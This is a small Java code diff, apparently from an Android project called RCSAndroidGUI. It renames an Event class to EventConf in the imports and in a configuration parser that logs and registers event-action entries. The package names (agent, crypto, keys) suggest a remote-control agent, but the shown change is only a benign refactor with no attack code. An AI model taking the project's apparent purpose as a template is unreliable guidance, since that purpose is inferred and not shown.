@@ -20,7 +20,7 @@ import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.crypto.Crypto;
 import com.ht.RCSAndroidGUI.crypto.Keys;
-import com.ht.RCSAndroidGUI.event.Event;
+import com.ht.RCSAndroidGUI.event.EventConf;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -271,7 +271,7 @@ public class Configuration {
 			Log.d("RCS", "Event: " + type + " Action: " + action
 					+ " Params Len: " + plen);
 
-			final Event e = new Event(type, i, action, params);
+			final EventConf e = new EventConf(type, i, action, params);
 			statusObj.addEvent(e);
 		}
 
